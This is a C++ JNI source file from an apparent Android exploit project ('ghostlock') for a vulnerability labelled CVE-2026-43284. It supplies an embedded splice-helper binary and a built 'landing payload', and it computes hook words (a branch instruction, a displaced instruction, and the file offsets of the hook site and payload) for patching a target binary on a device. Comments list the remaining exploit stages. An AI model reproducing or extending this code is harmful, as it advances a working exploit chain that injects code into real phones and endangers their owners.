/** @file jni/ops_43284_device.cpp
 *  43284's first real ops: the bytes this build carries and the hook plan it was built for.
 *
 *  These two ops need nothing from the device to be *computed* -- the helper image, the landing
 *  payload and the sentry plan are facts about this build, not about the phone -- but they are the
 *  first ops that return real content through the boundary, so they run on it: the device gate hashes
 *  what came back through JNI and compares it with the digests recorded in the blobs' own headers
 *  (and with the host test that pins the same numbers).
 *
 *  The remaining ops (resolve/write_block/read_block/trigger/wait_terminal) stay null: their work
 *  is the door, the splice surface, the ESP frame, the fork and the terminal wait -- all device work
 *  that belongs to J4b and is verified with a device, not here.
 */
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <span>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "jni/ops_43284.hpp"

namespace ghostlock::jni {
    namespace {
        /** The two roles EmbeddedImage serves. */
        constexpr std::uint64_t kRoleSpliceHelper = 0U;
        constexpr std::uint64_t kRoleLandingPayload = 1U;

        /** Where the built payload lands; the ops layer copies it into the reply before returning. */
        std::uint8_t g_payload[1024] = {};
        std::size_t g_payload_size = 0U;
        bool g_payload_ready = false;

        bool landing_embedded_image(std::uint64_t role, std::span<const std::byte> &image,
                                 void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            if (role == kRoleSpliceHelper) {
                const auto *bytes = embed::splicehelper_bytes();
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(bytes),
                                                   embed::splicehelper_padded_size());
                return true;
            }
            if (role == kRoleLandingPayload) {
                /* The landing payload is the blob with its two parameterised words filled in, which
                 *  is what the hook writes; the raw blob is not written anywhere. */
                const hook::SentryPlan plan = hook::device_sentry_plan();
                std::size_t size = 0U;
                if (!g_payload_ready) {
                    if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                        hook::SentryError::Ok) {
                        return false;
                    }
                    g_payload_size = size;
                    g_payload_ready = true;
                }
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                   g_payload_size);
                return true;
            }
            return false;
        }

        bool landing_hook_words(std::uint64_t &branch_word, std::uint64_t &displaced_word,
                             std::uint64_t &site_offset, std::uint64_t &landing_offset,
                             std::span<const std::byte> &payload, void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            const hook::SentryPlan plan = hook::device_sentry_plan();
            std::uint32_t branch = 0U;
            if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
                return false;
            }
            std::size_t size = 0U;
            if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                hook::SentryError::Ok) {
                return false;
            }
            g_payload_size = size;
            g_payload_ready = true;
            branch_word = branch;
            displaced_word = plan.displaced_instruction;
            /* The plan carries file offsets; the boundary works in offsets, so they travel as they
             *  are and the caller decides which file they belong to (the hook target it resolved). */
            site_offset = plan.hook_file_offset;
            landing_offset = plan.payload_file_offset;
            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload), size);
            return true;
        }
    }  // namespace

    /** The ops this build can serve today (see the header for what is deliberately absent). */
    Ops43284Seams device_landings_43284() noexcept {
        Ops43284Seams ops{};
        ops.embedded_image = &landing_embedded_image;
        ops.hook_words = &landing_hook_words;
        return ops;
    }
}  // namespace ghostlock::jni
